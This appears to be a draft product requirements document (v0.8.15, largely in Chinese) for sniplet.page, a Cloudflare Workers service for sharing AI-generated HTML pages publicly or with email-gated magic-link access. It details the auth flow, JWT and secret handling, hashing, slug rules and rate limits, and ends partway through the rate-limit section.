# PRD: sniplet.page

**狀態**: Draft v0.8.15(第八輪 audit MEDIUM 全清 + H-6 加保護;承接 v0.8.14)
**作者**: XP
**日期**: 2026-04-22
**Stack**: Cloudflare Workers + R2 + KV + TypeScript + Resend

---

## 1. 產品定位

> **AI 生成網頁的分享按鈕** — 零帳號、零 API key、零設定,agent 一句話就產 URL 給使用者分享。支援公開分享,也支援限定 email 私享。

**品牌**:`sniplet.page` = 產品名 = 網域名(合一,類比 cal.com、val.town)
**命名由來**:sniplet = snippet + let,強調「一小片網頁、瞬間即得」

## 2. 問題陳述

Claude、ChatGPT 等 AI 極擅長產生 single-file HTML(report、dashboard、landing page、互動視覺化)。工程師用爽,但要「分享給主管 / 客戶 / 同事看」就全卡住:

- `.html` 副檔名非工程師不懂,心智模型對不上
- Netlify Drop / GitHub Pages 對非工程師仍有註冊、拖拽、理解 URL 等認知成本
- `.html` 在 LINE / Email 附件手機打不開、常被資安系統擋
- **想只給特定對象看,但又不想架帳號系統**
- Agent 端現有方案(shipsite.sh、Deloc、Runbox)全部要 API key、要設定,不是 AI-native

**空白在哪**:沒人做「agent 跟人之間、零摩擦的 share layer」,天生支援公開+私享雙模式。

## 3. 目標使用者

| 優先級 | 角色 | 情境 |
|---|---|---|
| P0 | Agent 使用者(個人) | 用 Claude.ai / ChatGPT / Claude Code 產 HTML 後想分享 |
| P0 | 接收者(非工程師) | 主管、客戶、家人收到 URL 要打開看 |
| P2 | Enterprise / Team | v2+(付費版) |
| P2 | Developer | 已有 Netlify / Vercel,不是主戰場 |

## 4. 核心設計原則

1. **AI-first UX**:使用者不離開 agent 對話就完成分享
2. **Zero API key**:匿名即可用,creator 認證留給 v2 付費場景
3. **Skill-first 分發**:一份 SKILL.md 跨 agent 通用,比 MCP 好分發 10 倍
4. **Happy path ≤ 10 秒**:從「幫我分享」到 URL 出現
5. **URL 看起來可信**:HTTPS、語意化 slug、無注入第三方廣告 / 追蹤
6. **Semantic by AI + 永遠 postfix**:slug 由 agent 決定語意,**server 永遠加 4 字元 postfix**(避免品牌挪用 / 釣魚混淆)
7. **Subdomain per sniplet**:每個 sniplet 自己的 subdomain,SOP 天然隔離
8. **Access control opt-in**:預設公開、可選 email 白名單,不強制帳號
9. **Creator 是主人**:creator(人或 AI)對 sniplet 有完整控制權,不做 paternalism
10. **Receiver 隱私優先**:viewer 的 email 僅用於 magic link 驗證,不作他用、不跨站追蹤

## 5. 使用情境

### 情境 A:Claude.ai Web(公開分享)
```
XP: 幫我把這個 Q3 銷售 dashboard 分享給主管
Claude: (執行 sniplet skill → 想 slug "q3-sales-dashboard"
        → POST api.sniplet.page/v1/sniplets
        → server 加 postfix)
        好的,網址在這:https://q3-sales-dashboard-a7k2.sniplet.page
        7 天後自動過期。
```

### 情境 B:Claude Code / Cursor / Codex CLI
Skill 裝在 `~/.claude/skills/`,agent 用 `curl` 執行。行為同上。

### 情境 C:接收者(非工程師)
手機 LINE 收到 URL → 點開 → RWD 自動渲染 → 不用下載、App、登入。

### 情境 D:限定 email 分享
```
XP: 幫我分享這份報告,只給 alice@co.com 和 bob@co.com 看
Claude: (POST 時帶 viewers: ["alice@co.com", "bob@co.com"])
        好的,私享網址:https://q3-private-report-m8f1.sniplet.page
        只有 Alice 和 Bob 用 email 驗證後能看。
```

### 情境 E:Alice 跨 sniplet 共用 session
```
Alice 星期一:收到 Bob 分享的 B 私享 sniplet,點 magic link 驗證 alice@co.com
           → .sniplet.page scope 的 session cookie 已建立(sub = HMAC(alice@co.com))
Alice 星期二:收到 Carol 分享的 C 私享 sniplet(Alice 在 viewers 白名單)
           → Browser 自動帶上 cookie
           → Server 驗 cookie → sub(HMAC)比對 C.meta.viewers[].h
           → 通過,不用再走 magic link 流程
```

## 6. MVP Scope

### ✅ In-Scope (Must Have)

- [ ] `POST /v1/sniplets` 匿名可用,收 HTML(≤1MB) + slug + viewers,回 subdomain URL
- [ ] **Slug 永遠 postfix**(server 自動加 4 字元 [a-z0-9],最多 retry 5 次)
- [ ] `PATCH /v1/sniplets/:slug/viewers`(帶 owner_token)支援 add + remove,可跨 access mode 切換
- [ ] `DELETE /v1/sniplets/:slug`(帶 owner_token)
- [ ] `GET /` on `{slug}.sniplet.page` 公開 / 私享雙模式
- [ ] Reserved subdomains 黑名單(撞到硬錯 400)
- [ ] **Viewers 上限**:單個 sniplet 最多 **3** 個 email(Free tier)
- [ ] 7 天 TTL + 每日 cron 清理(UTC 02:00)
- [ ] 每日總建立量 hard cap(1000 sniplets/day)
- [ ] **Email-gated sniplets 免費,無 creator 配額**
- [ ] `POST /auth/request`(含 Turnstile + per-email rate limit 3/hr、10/day + per-IP 30/day)
- [ ] **兩段式 auth**:`GET /auth/verify` 顯示確認頁(不 consume token)+ `POST /auth/consume` 實際 verify
- [ ] **One-shot token**:consumed magic links 不可 replay(KV 記錄)
- [ ] Challenge page HTML(見 §10)
- [ ] **Root `sniplet.page/` 與 `sniplet.page/SKILL.md` 永遠回 SKILL.md**(text/plain + Content-Disposition `inline; filename="SKILL.md"`)
- [ ] **Email reverse index(KV)**:加速 `/auth/request` 的白名單查詢
- [ ] **Workers Analytics Engine** 記 backend events(不記 PII、不碰 sniplet 內容)
- [ ] **統一嚴格 CSP**(`connect-src 'none'`、allowlist CDN),所有 sniplet 共用
- [ ] **HTTP security headers**:`X-Frame-Options: DENY`、`X-Content-Type-Options: nosniff`、`Referrer-Policy: no-referrer`
- [ ] SKILL.md v1(獨立檔案,與 PRD 並列於交付 bundle)
- [ ] Email template(純文字 + 乾淨 HTML 雙版,見 §9)

### 🚫 Out of Scope (v2+)

- Device flow / creator 帳號系統 → Pro tier 一起做
- **純自訂 slug(無 postfix、strict mode)→ Pro tier**
- Dashboard、statistics UI → Pro tier
- **Team 自訂 subdomain**(`{team}.sniplet.page/{slug}` 形式)→ v2 Team tier
- 自訂網域 → Enterprise
- 密碼保護
- Provenance metadata
- Comment / feedback 迴路
- 多檔案(v1 只收單檔 HTML)
- JWT revoke list
- Abuse report endpoint
- IP rate limit on failed GET(Cloudflare 邊緣已處理)
- Edge caching(v0.8.10 評估後移除,ROI 低)
- **Privacy Policy 本體 + GDPR Art 17 erasure 窗口**(v2 一批做,含 `privacy@` inbox 與自助 endpoint;v1 依 7 天 TTL 自然過期,見 §12)
- 第三方廣告、GA / 其他前端追蹤(**永不加**)
- Public status page → v2

## 7. 技術架構

### 7.1 Stack

- **Platform**: Cloudflare Workers + R2 + KV
- **Analytics**: Cloudflare Workers Analytics Engine
- **Language**: **TypeScript**(決定 — 見 §7.11)
- **Email**: Resend(獨立廠商,非 Cloudflare)
- **Bot protection**: Cloudflare Turnstile
- **Domain**: `sniplet.page`(`.page` TLD 為 HSTS preloaded,天然強制 HTTPS)
  - 使用者入口 + auth: `sniplet.page/*`(apex)
  - API: `api.sniplet.page/*`
  - **Sniplet 內容**: `{slug}.sniplet.page/*`(每 sniplet 自己的 subdomain)
- **Wildcard DNS**:一筆 `*.sniplet.page` A/AAAA record → Workers,處理所有 sniplet subdomain
- **Wildcard SSL**:CF Universal SSL 免費一層 wildcard cert(`*.sniplet.page`),Certificate Transparency log 只留一筆(不 per-sniplet)

### 7.2 Environment Variables
- `SESSION_JWT_SECRET` — HMAC 簽章密鑰,**僅**用於 session cookie JWT(7 天,與 sniplet TTL 對齊)
- `MAGIC_JWT_SECRET` — HMAC 簽章密鑰,**僅**用於 magic link JWT(15 分鐘)
- `RESEND_API_KEY`
- `TURNSTILE_SECRET`
- `EMAIL_HASH_SECRET` — HMAC-SHA256 salt for email indexing(防 rainbow table)
- `IP_HASH_SECRET` — HMAC-SHA256 salt for IP hashing(防 IPv4 離線窮舉;IPv4 僅 2³² 空間,純 SHA-256 可被現代 GPU 秒級還原)
- `ENVIRONMENT` — dev / prod

**為何 JWT 拆兩個 secret**:即使 JWT 驗證邏輯某處遺漏 `purpose` 欄位檢查,magic link token 也無法被當 session 用(因為用不同 secret 簽)。`purpose` 欄位仍保留作為第二層防禦(belt-and-suspenders)。

### 7.3 Bindings
- **R2**: `SNIPLETS`(物件儲存)
- **KV**:
  - `METER_KV`(rate limit + daily quota)
  - `EMAIL_INDEX_KV`(email → slug 反向索引)
  - `MAGIC_CONSUMED_KV`(one-shot token 狀態,防 magic link replay)
- **Analytics Engine**: `ANALYTICS`(backend events)

**KV eventually consistent — 已接受的 trade-off**(F-41,v0.8.15 明寫):
- CF Workers KV 為跨區域最終一致,write-after-read 在同一 worker instance 強一致,但**跨 PoP 可能 lag 數秒**
- 實務影響:
  - `METER_KV` rate limit counter 的 burst race(F-8 已 document,daily cap 1000 兜底)
  - `EMAIL_INDEX_KV` 新加 viewer 瞬間(POST / PATCH 成功後)到真的可被 `/auth/request` 查到,可能有數秒 lag(§7.10 已 document,極罕見漏發)
  - **`MAGIC_CONSUMED_KV` 的 replay race**:攻擊者若手持 valid magic JWT 且在極窄時間窗口(< 複寫傳播延遲,約 <10 秒)內從兩個遠距 CF PoP 同時 POST `/auth/consume`,兩邊都讀到 null 後各自 `KV.put(jti)` + 簽 session → 一條 token 能產生兩個 session
- 攻擊前提:
  1. 攻擊者已取得他人 valid magic JWT(即裝置遺失 / email 被截 / URL 外洩的嚴重情境)
  2. 攻擊者有能力精準時間同步兩個 PoP 同時發 request(需 infrastructure + timing know-how)
  3. 窗口極短(KV 複製通常秒級)
- 接受理由:此攻擊前提極嚴格;且成功的後果僅是「攻擊者多取得一個與受害者等權限的 session」,而非權限提升;偵測機制已有 `auth_consumed outcome=replay` alert(> 10/hr 觸發),實際發生率可量化
- **v2 升級路徑**:若 alert 顯示實際發生率非零,改用 Durable Objects counter(強一致,無 race window;成本 ~$0.15/M requests)取代 KV one-shot 標記

### 7.4 Cron Triggers
- Expression: `0 2 * * *`(UTC 02:00 daily)
- Handler:掃 R2 `sniplets/` prefix,刪除 `expires_at < now` 物件,同時清 `EMAIL_INDEX_KV` 對應條目
- **成功結尾**:寫一筆 `ANALYTICS.writeDataPoint({ blobs: ["cron_cleanup_success"], doubles: [deleted_count], indexes: [today] })`。CF Dashboard 設「24hr 無此 event → alert」

### 7.5 路由優先順序

**`api.sniplet.page`**:
| Path | Method | Handler |
|------|--------|---------|
| `/v1/sniplets` | POST | Create |
| `/v1/sniplets/:slug` | DELETE | Delete(需 owner_token) |
| `/v1/sniplets/:slug/viewers` | PATCH | Update viewers(需 owner_token) |
| `/v1/csp-report` | POST | CSP violation report ingest(寫 `csp_violation` event,回 204;見 §7.19) |
| 其他 | * | 404 |

**`sniplet.page`**(apex,auth 統一入口):
| Path | Method | Handler |
|------|--------|---------|
| `/` | GET | Root — 永遠回 SKILL.md(text/plain;v0.8.13 取消 Accept 分流) |
| `/SKILL.md` | GET | Root 別名 — 同上,供 `curl -O` 自然命名 |
| `/auth/request` | POST | Auth request(發 magic link) |
| `/auth/verify` | GET | Auth verify — **顯示確認頁,不 consume token** |
| `/auth/consume` | POST | Auth consume — **實際驗證 + set cookie + redirect** |
| `/auth/logout` | POST | Auth logout(清 cookie,MUST 驗 Origin) |
| `/security` | GET | Security policy page(§10.7) |
| `/.well-known/security.txt` | GET | RFC 9116 security.txt(§10.8) |
| `/auth/*` 其他 | * | 404 |
| `/*` 其他 | * | 404(reserved 或 unknown) |

**`{slug}.sniplet.page`**(sniplet 內容):
| Path | Method | Handler |
|------|--------|---------|
| `/` | GET | Sniplet GET(公開直接 serve,私享比對 cookie) |
| `/*` 其他 | * | 404 |

Worker 依 hostname 判斷分流(`api.sniplet.page` / `sniplet.page` / 其他 `*.sniplet.page` 為 sniplet 內容)。

### 7.6 資料流(公開)

```
Agent → POST api.sniplet.page/v1/sniplets { html, slug }
     → 驗 slug 格式 → 查保留字
     → 一律加 4 字元 postfix(最多 5 次 retry 避衝突)
     → 寫 R2 → Analytics.writeDataPoint(sniplet_created)
     ← { slug: "q3-sales-a7k2", url: "https://q3-sales-a7k2.sniplet.page",
         expires_at, owner_token, access: "public" }

Visitor → GET https://q3-sales-a7k2.sniplet.page/
       → Worker 從 hostname 取 slug → 讀 R2
       → meta.viewers == null → Serve HTML + security headers (統一嚴格 CSP)
       → Analytics.writeDataPoint(sniplet_viewed)
```

### 7.7 資料流(私享)

```
Creator → POST api.sniplet.page/v1/sniplets
         { html, slug, viewers: ["alice@co.com", ...] }   ← 明文 email from client
       → server normalize + HMAC 每個 email → 生成 { h, m } objects
       → 寫 R2 meta.viewers(全 HMAC + masked 形式)+ 寫 EMAIL_INDEX_KV(HMAC key)
       ← { slug, url, ..., access: "email-gated",
           viewers_masked: ["a***@co.com", ...] }         ← response 只回 masked,不回 HMAC

Alice(首次)
  1. GET https://q3-private-m8f1.sniplet.page/
     → 讀 R2 → meta.viewers != null + 無 cookie → 回 challenge page(§10)
     → Challenge page 的 form action 指向 https://sniplet.page/auth/request
       (apex 統一處理 auth,challenge page 做 cross-origin form POST)

  2. POST sniplet.page/auth/request { email, return_to, turnstile_token }
     → Turnstile 驗證
     → per-email rate limit(3/hr, 10/day)+ per-IP rate limit(30/day per /64)
     → Strategy C: 通過前兩關後永遠回 200
     → 內部:normalize email → HMAC → 查 EMAIL_INDEX_KV["viewer:<hmac>"]
            → 若 hit:ctx.waitUntil(resend.send(...))  ← defer,response 不等
            → 若 miss:silently skip
     → 立刻回 200(不論 hit/miss,設計目標 latency 差 < 5ms)

  3. Alice 點 email 中的連結
     → GET sniplet.page/auth/verify?t=<magic-jwt>&r=<return_to>
     → 顯示「Continue to sign in」確認頁
     → 頁面有 button → 點擊觸發 JS
     → **不 consume token,只把 token 放入頁面 form**
     → 此設計防止 email 安全掃描器自動 fetch /auth/verify 時消耗 token

  4. Alice 點確認頁的「Continue」button
     → POST sniplet.page/auth/consume { t: <token> }
     → 驗短期 JWT(MAGIC_JWT_SECRET + purpose === "magic")
     → 檢查 MAGIC_CONSUMED_KV[jti] 是否存在(若存在 → 422 already_consumed)
     → 寫 MAGIC_CONSUMED_KV[jti] = 1(TTL 16 分鐘,比 JWT exp 多 1 分鐘兜底)
     → 驗 return_to 合法性(§8 規則)
     → 簽 session JWT(SESSION_JWT_SECRET,purpose: "session")
     → Set-Cookie: st=<jwt>; HttpOnly; Secure; SameSite=Lax;
                    Domain=sniplet.page; Path=/; Max-Age=604800
       ← Domain=sniplet.page 讓 cookie 可跨所有 *.sniplet.page
         browser 會自動附在後續 sniplet subdomain 的 request 上
     → 200 JSON { redirect: return_to }
     → Client JS 接到後 window.location = redirect

  5. GET https://q3-private-m8f1.sniplet.page/(帶 cookie)
     → Worker 驗 JWT(SESSION_JWT_SECRET + purpose === "session")
     → 取 sub(HMAC)→ 比對 meta.viewers[].h(純字串相等)→ 通過 → Serve HTML

Alice(二次,另一個 sniplet)
  1. GET https://other-sniplet-x9k2.sniplet.page/
     → Browser 自動帶 .sniplet.page scope cookie
     → Worker 驗 cookie → sub(HMAC)比對 other-sniplet 的 meta.viewers[].h
     → 在 whitelist → 直接 serve(無需再走 magic link)
     → 不在 whitelist → challenge page(Alice 需為這個 sniplet 再驗)
```

**關鍵安全屬性**:
- Cookie `Domain=sniplet.page` 讓 UX 順暢(一次驗 email 跨 sniplet 共享)
- SOP 讓每個 sniplet 在自己的 origin,**sniplet 裡的 JS 無法 fetch / window.open / iframe 其他 sniplet** — cross-sniplet isolation 由 browser 原生 SOP 保證,不靠軟體層機制
- Cookie 雖被 browser 帶去每個 `*.sniplet.page` 的 request,**但 viewer 的 HTML(被 CSP 鎖死)無法讀 cookie**(HttpOnly),也無法從平台 Worker 的執行路徑中攔截 — 平台 code 閉源,viewer 的 HTML 跑在 browser 的 viewer-side

### 7.8 Size / 格式限制
- **單個 HTML ≤ 1MB**(POST request body)
- R2 物件本身 5GB,1MB 是「這是 sniplet 不是網站」的語意硬編
- 超過直接回 400 `invalid_format`

### 7.9 R2 結構

```
sniplets/{slug}/
  ├── index.html
  └── meta.json
      {
        "created_at": "...",
        "expires_at": "...",
        "ip_hash": "...",             // HMAC-SHA256(IP_HASH_SECRET, normalize(ip));IPv6 先 normalize 到 /64 再 hash(見 §7.15)
        "owner_token_hash": "...",    // SHA-256(owner_token);constant-time 比對見 §7.14
        "viewers": [
          { "h": "<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>",
            "m": "a***@co.com" }      // masked display for creator UI
        ] | null
      }
```

**欄位設計說明**:
- **`ua` 欄位不存**:v1 沒有明確用途,存明文 UA 對 creator fingerprinting 有助攻。Abuse 調查若需要 UA,走 CF Workers Trace 或 CF Log(平台層),不在 application 層重複 minimize
- **`viewers`**(v0.8.11 F-11 升 v1):每個 viewer 存一個 `{ h, m }` object
  - `h`:`HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))`,與 §7.10 `EMAIL_INDEX_KV` 用同一組 secret + normalize,方便交叉查
  - `m`:masked display,格式 `{first-char}***@{domain}`(e.g., `a***@co.com`),供 PATCH / POST response 讓 creator 確認自己加了誰
  - **R2 外洩只 leak first-char + domain**,而非完整 email;攻擊者無法反推完整 email(需 `EMAIL_HASH_SECRET`)
  - 授權比對:server 對 session cookie 的 `sub`(也是 HMAC,見 §7.13)與 `viewers[].h` 做字串比較,不需明文 email
  - PATCH add/remove 接受明文 email,server 先 `normalize → HMAC`,再與 `viewers[].h` 比對(remove)或附加(add)

**Slug 在 R2 中的命名**:以 **postfix 後的完整 slug** 為 key(如 `q3-sales-a7k2`),不是 user-supplied 的 `q3-sales`。subdomain hostname 的 slug 部分直接對應 R2 key。

### 7.10 Email Reverse Index(KV)

**目的**:`/auth/request` 收到 email 時,O(1) 查出是否在任何 active sniplet 白名單。

**Email 正規化**(寫入與查詢前皆套用):
```
normalize(email) = email.trim().toLowerCase()
```

**KV Key**:`viewer:<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>` → `{ slugs: ["slug-a7k2", "slug-b9m3", ...] }`

**為何 HMAC 而非純 SHA-256**:若 `EMAIL_INDEX_KV` 外洩,純 SHA-256 可被 rainbow table 還原常見 email。HMAC with secret salt 讓離線破解不可能(攻擊者也要先拿到 `EMAIL_HASH_SECRET`)。

**寫入時機**:POST / PATCH viewers(全部 email 先 normalize 再 hash)
**讀取時機**:`/auth/request`(email 先 normalize 再 hash)
**清理時機**:DELETE、cron 過期清理
**KV TTL**:每個 entry 寫入時設 TTL = 對應 sniplet 剩餘 `expires_at` 秒數(最多 7 天),確保 sniplet 過期即自動失效;DELETE / cron cleanup 為兜底。RUNBOOK §2.4 `EMAIL_HASH_SECRET` dual-write migration 依賴此 TTL 讓舊 key 自然過期

**一致性**:KV 是 eventually consistent,`/auth/request` 極罕見漏發(新加 viewer 瞬間)— MVP 可接受。

**Known limitations**:
- **Gmail `+tag` 與 `.` 別名不處理**:`alice+foo@gmail.com`、`alice.smith@gmail.com`、`alicesmith@gmail.com` 實際是同一 Gmail 信箱,但 sniplet 視為三個不同 viewer。Creator 需提供精確 email。不是 security issue(Strategy C + HMAC 都守得住),但 creator 可能拼錯 variant 而困惑
- **Timing**:hit 與 miss 的 code path latency **設計目標 < 5ms**(Resend 發送已 defer);**測試 SLO < 20ms**(容許網路噪音 / CF PoP 差異;§11 P0 測試以 20ms 為 pass 門檻)

### 7.11 基礎設施防護依賴

sniplet.page 依賴 Cloudflare 邊緣的自動保護,**應用層不重複實作**以避免 over-engineering。

**Cloudflare Free plan 自動提供**(domain 接入即生效):

| 防護 | 範圍 |
|------|------|
| DDoS mitigation | L3/L4/L7,無限量,永久免費 |
| SSL/TLS(Universal SSL) | 自動 provision;wildcard cert 覆蓋 `*.sniplet.page` |
| 基本 WAF Managed Rulesets | OWASP top 10、SQL injection、XSS 等 |
| AI Labyrinth | 針對違反 `robots.txt` 的 AI scraper 餵假內容 |

**需手動啟用**(Cloudflare Dashboard):
- Bot Fight Mode(Security → Bots → Enable)

**應用層 (Worker) 自己處理**:
- **統一嚴格 CSP**(§7.19;所有 sniplet 共用一份,作為 per-sniplet sandbox + platform abuse 防線)
- `X-Frame-Options: DENY`(防 iframe 嵌入)
- `X-Content-Type-Options: nosniff`(防 MIME sniffing)
- `Referrer-Policy: no-referrer`
- Daily cap 1000 sniplets/day(超過回 503)
- `/auth/request` Turnstile + per-email + per-IP rate limit
- `/auth/consume` MAGIC_CONSUMED_KV 防 replay

**明確不做**:
- ❌ Edge cache(v0.8.10 移除;ROI 低、增加 invalidation 複雜度)
- ❌ IP rate limit on failed GET(Cloudflare Bot Fight Mode 已處理暴力爬蟲)
- ❌ Slug enumeration 專門防禦(成本近零 + Strategy C 已防洩漏 + postfix 本身有 46656 entropy per slug 名)
- ❌ Content scanning(v1 TTL 7 天兜底,v2 評估)
- ❌ Abuse report endpoint(v2)
- ❌ Fetch Metadata / COOP(v0.8.10 移除;subdomain-per-sniplet 架構下 SOP 已天然隔離,軟體層防線不需要)

### 7.12 為什麼 TypeScript 不是 Go

Go 在 Cloudflare Workers 需要 TinyGo → WASM bridge,R2/KV/Cache API/Analytics 無原生 SDK,`wrangler dev` 體驗差,開發時間翻倍。TypeScript 是 Workers 一等公民,Claude Code 能力最強的 stack。Go 留給 Flology 主業,本專案不混雜。

### 7.13 JWT 結構與驗證規則

**Session cookie**(7 天,與 sniplet TTL 對齊): `{ "sub": "<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>", "purpose": "session", "iat": ..., "exp": ..., "v": 1 }`
**Magic link token**(15 分鐘): `{ "sub": "<HMAC 同上>", "purpose": "magic", "return_to": "...", "jti": "...", "iat": ..., "exp": ..., "v": 1 }`

**`return_to` 權威來源(F-36,v0.8.14)**:`/auth/consume` **MUST** 從此 JWT claim 取 `return_to`,**不得**接受 request body / URL query 中的值(body 已簡化為 `{t}`,verify page URL 已移除 `&r=`)。JWT 在 `/auth/request` 階段由 server 簽署,`return_to` 是 server 原始輸入,不受 email 轉寄 / browser history / MITM 在 magic link URL 加料所影響。取得後仍走 §8 `validateReturnTo` 白名單,失敗 fallback `https://sniplet.page/`。

**`sub` 為 HMAC 而非明文 email(v0.8.11 F-11 升 v1)**:
- Cookie 外洩時 payload 解開也只拿到 hash,無法反推 email(需同時拿 `EMAIL_HASH_SECRET`)
- 與 `meta.viewers[].h`、`EMAIL_INDEX_KV` key 用同一演算法 + 同一 secret,授權比對是單純字串相等,無需 server 反向知道 viewer email
- `EMAIL_HASH_SECRET` 輪換會同時使所有 session、meta.viewers[].h、email index 失效;此為 event-driven 高成本操作,流程見 RUNBOOK §2.4
- `/auth/request` 與 `/auth/consume`:server 在簽 magic JWT 前先對 email 做 HMAC → 放入 `sub`;`/auth/consume` 簽 session JWT 時直接沿用 magic token 的 `sub`,不需再 hash

`jti` 是隨機 UUID,供 `/auth/consume` 比對 `MAGIC_CONSUMED_KV` 防 replay。

**簽章演算法**:`HS256`(HMAC-SHA256)。單一 Worker 不需公私鑰分離。Worker 驗簽 library 必須 enforce algorithm 為 `HS256`;**MUST reject** `alg: "none"` 與 algorithm confusion(例如攻擊者送 asymmetric token 嘗試用 HMAC secret 驗),標準 JWT library 的 known pitfall。

**Secret 使用規則**:
- Session JWT **僅**用 `SESSION_JWT_SECRET` 簽章與驗證
- Magic link JWT **僅**用 `MAGIC_JWT_SECRET` 簽章與驗證
- 兩者**不共用** secret。即使 `purpose` 欄位檢查失誤,magic token 也無法被當 session 驗證通過(簽章直接不符)
- `v` 保留給 rotate secret(見 RUNBOOK.md 的 rotation 流程)

**驗證規則(MUST)**:
- 驗 session cookie:用 `SESSION_JWT_SECRET` 驗簽 + `purpose` MUST === `"session"`,否則 reject
- 驗 magic link token(在 `/auth/consume`):用 `MAGIC_JWT_SECRET` 驗簽 + `purpose` MUST === `"magic"` + `jti` MUST 不在 `MAGIC_CONSUMED_KV`
- 沒 `purpose` 欄位或值不符 → 視為 invalid token
- 兩層防禦:即使某路徑遺漏 `purpose` 檢查,獨立 secret 仍擋下跨用

### 7.14 owner_token 規格
- **格式**:32 bytes 隨機(256-bit entropy),base64url 編碼,前綴 `ot_`;最終長度 46 字元(3 prefix + 43 base64url,無 padding)
- **生命週期**:跟 sniplet 綁定,sniplet 過期 / 被刪 → token 失效
- **儲存**:meta.json 存 SHA-256 hash,原 token 只在 POST response 回一次
- **驗證**:server 比對 hash(token)vs stored hash **必須用 constant-time 比對**;Cloudflare Workers 無 `crypto.subtle.timingSafeEqual`(不存在於 Web Crypto API),使用以下任一:
  - Node.js compat: `import { timingSafeEqual } from 'node:crypto'`(需啟 `nodejs_compat` compatibility flag)
  - 手寫 constant-time loop:
    ```ts
    function timingSafeEqual(a: Uint8Array, b: Uint8Array): boolean {
      if (a.length !== b.length) return false;
      let diff = 0;
      for (let i = 0; i < a.length; i++) diff |= a[i] ^ b[i];
      return diff === 0;
    }
    ```
  - **禁用** `===` / `==` / `Buffer.compare`(後者非 constant-time)
- **不支援** re-generation
- **Edge log hygiene**:ops 須確認 CF Log Push 未啟用,或 `Authorization` header 在 drop list(RUNBOOK §7)

### 7.15 Slug 策略與 Subdomain 架構

**格式要求**:3–40 字元、lowercase alphanumeric + hyphen、不可 `-` 開頭/結尾、不可連續 `--`
**語言規範**:agent 選 slug 時一律以**英文為底**;非英文內容做 transliterate(中文 → pinyin、日文 → romaji、韓文 → romanized)。slug 是 URL 一部分,ASCII 跨平台相容性最高,也避免 IDN punycode 顯示醜
**來源**:agent 在 POST request 中提供 `slug`
**Fallback**:沒給 slug → 8 字元隨機 ID

**衝突處理 — 永遠 postfix(v0.8.10 決定)**:
- 撞 reserved → 400 `reserved_slug`(硬錯,不 postfix)
- **一律加** `-{4 字元 [a-z0-9]}` postfix,即使 slug 本身唯一也加
- **衝突偵測機制(F-34,v0.8.12)**:R2 `put` 一律帶 `onlyIf: { etagDoesNotMatch: '*' }`(create-only 語義),`PreconditionFailed` 即為碰撞訊號,觸發重抽 postfix 重試。**不**使用「先 `head` 再 `put`」(該做法有 TOCTOU race,並發 POST 抽到同一 postfix 時後寫者會覆蓋前者,導致兩個 owner_token 指向同一物件)
- 最多 retry 5 次;仍衝突回 500 `slug_retry_exhausted`
- Response 的 `slug` / `url` 反映最終值(包含 postfix),client 必須以 response 為準

**Postfix 產生**:`crypto.getRandomValues()`(禁用 counter / timestamp,防洩漏系統流量訊號)

**為何永遠 postfix(v0.8.10 改為硬規則)**:
- 防品牌挪用:`acme-q4-earnings.sniplet.page` 不可能存在,attacker 無法搶註
- 防釣魚混淆:`paypal-login-a7k2.sniplet.page` 中的 postfix 本身是「這是臨時連結而非官方域」的視覺訊號
- CT log 只留 wildcard cert 一筆,不 per-slug 曝光
- Path-based 時代的 "你可以選到未加 postfix 版本" 誘因消失,UX 公平

**Subdomain URL 結構**:`https://{slug}.sniplet.page`
- DNS wildcard `*.sniplet.page` → Workers,per-sniplet 0 DNS 成本
- SSL wildcard `*.sniplet.page` 由 CF Universal SSL 管,免費、一張證書
- Worker 從 `request.url` 解析 hostname → 切出 slug:`new URL(request.url).hostname.replace('.sniplet.page', '')`

**v2 Pro tier**:引入 `on_conflict: "strict"`,衝突時回 409 不 postfix(但仍加 `-{postfix}` 作為品牌保護)。  
**v2 Team tier**:支援 `{team}.sniplet.page/{slug}` 形式,team-scope path-based,team 內 sniplet 共用 team subdomain(接受 team 內互信,跨 team 靠 subdomain 硬隔離)。

### 7.16 Reserved Subdomains

以下 subdomain 保留,POST 時若 slug(加 postfix 後)匹配這些 → 400 `reserved_slug`,同時 apex path 也不使用為 sniplet:

`api`, `www`, `admin`, `docs`, `status`, `blog`, `help`, `support`, `app`, `auth`, `login`, `signup`, `dashboard`, `settings`, `pricing`, `about`, `terms`, `privacy`, `security`, `mail`, `smtp`, `ns1`, `ns2`, `cdn`, `assets`, `static`, `media`, `img`, `dev`, `staging`, `test`, `prod`

Apex `sniplet.page` 路徑也 reserve `/robots.txt`、`/sitemap.xml`、`/favicon.ico`、`/.well-known/*`、`/security`。

### 7.17 Rate Limit & 成本保護

| 端點 | 機制 | 設定 |
|------|------|------|
| `POST /v1/sniplets` | Daily cap + per-IP quota | 全站 1000 / day;單一 IP 50 / day(IPv6 normalize /64) |
| `POST /auth/request` | Turnstile + per-email + per-IP + **全站 send cap** | 3/hr、10/day per email;30/day per IP(v0.8.10 加);**全站實際 Resend send 100 / day**(F-32,v0.8.12 加,預設對齊 Resend 免費 tier ≈ 3000/月;升 tier 時同步 bump) |
| `POST /auth/consume` | Per-jti one-shot(MAGIC_CONSUMED_KV) | 每個 magic link 只能 consume 一次 |
| `POST /v1/csp-report` | Per-IP rate limit(F-40,v0.8.15) | 100 / min per IP;body 上限 8KB;CT 限 `application/csp-report` 或 `application/json` |
| Viewers 上限 | POST/PATCH 時檢查 | 3 email / sniplet(Free) |

**Per-IP 實作**:
- **IP normalize**:IPv4 保留完整 /32;IPv6 normalize 到 **/64**(取前 64 bit prefix)。理由:IPv6 單一家用 ISP 連線通常分配 /64,attacker 在 2⁶⁴ 位址空間內旋轉 source 會讓 per-IP counter 永遠是零。Normalize 到 /64 後,攻擊成本等同 IPv4 單一家用級別
- **KV key 格式**:`ip_quota:<HMAC-SHA256(IP_HASH_SECRET, normalized_ip)>:<YYYY-MM-DD>`、`rl_auth_ip:<...>:<YYYY-MM-DD>`
- **Hash**:用 HMAC-SHA256,符合 §7.22 logging hygiene
- **Window 類型**:fixed UTC day(每日 UTC 00:00 重置)。不採 rolling window,KV 實作簡單、cost 低;接受邊界 burst(攻擊者可在 UTC 整點前後各取 quota = 短期翻倍)作 trade-off,daily cap 1000 仍兜底
- **TTL**:KV entry 設 26 小時 TTL,自動回收

**Per-email 實作(`/auth/request`)**:
- **KV key 格式**:`rl_email:<HMAC-SHA256(EMAIL_HASH_SECRET, normalize(email))>:<hr|day>`
- **Window 類型**:fixed hour bucket(3/hr)+ fixed UTC day(10/day)

